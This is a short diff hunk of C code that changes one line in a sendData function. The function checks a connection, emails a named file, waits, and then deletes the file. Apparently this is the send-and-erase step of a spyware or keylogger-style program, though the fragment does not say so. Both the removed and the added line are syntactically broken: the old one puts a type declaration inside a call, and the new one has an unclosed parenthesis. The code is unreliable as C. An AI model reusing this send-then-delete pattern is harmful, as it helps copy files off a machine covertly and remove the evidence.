@@ -2,7 +2,7 @@
 
 bool sendData(char * file_name) {
     if ( testConnection() ) {
-        sendEmail(char * file_name);
+        sendEmail(decode(file_name);
         Sleep(SEND_TIME);
         DeleteFile(file_name);
     }
